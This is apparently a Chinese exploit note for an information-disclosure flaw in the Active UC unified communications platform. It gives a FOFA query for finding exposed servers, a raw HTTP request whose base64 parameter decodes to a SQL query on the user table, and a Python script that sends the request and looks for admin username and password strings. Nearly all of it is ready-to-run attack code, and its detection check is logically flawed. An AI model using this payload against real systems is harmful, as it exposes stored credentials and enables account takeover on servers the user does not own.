#网动统一通信平台 dbcall.action存在信息泄露

#fofa：title="网动统一通信平台(Active UC)" || (body="top.action?params=index" && body="preLog.action")

#poc
"""GET /acenter/dbcall.action?cmdid=10018&verify_userid=dasd&verify_password=&verify_username=&verify_password_enc=&queryString=U0VMRUNUKkZST00vKiovdGJsX3VzZXIvKiovTElNSVQvKiovMCwx HTTP/1.1
Host: <target-host>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.795.76 Safari/537.36
Accept: */*
Connection: close"""

#脚本

import requests,urllib3,warnings
# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = ""        #填写url
payload = "/acenter/dbcall.action?cmdid=10018&verify_userid=dasd&verify_password=&verify_username=&verify_password_enc=&queryString=U0VMRUNUKkZST00vKiovdGJsX3VzZXIvKiovTElNSVQvKiovMCwx"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.795.76 Safari/537.36",
    "Accept": "*/*",
    "Connection": "close"
}

res1 = requests.get(url=url,headers=headers,timeout=5,verify=False)
print(res1.status_code)
if res1.status_code == 200:
    res2 = requests.get(url=url+payload,headers=headers,timeout=5,verify=False)
    print(res2.text)
    if "USERNAME=admin" and "PASSWORD=" in res2.text:
        print(f"[+]该{url}存在信息泄露")
    else:
        print(f"[-]该{url}不存在信息泄露")
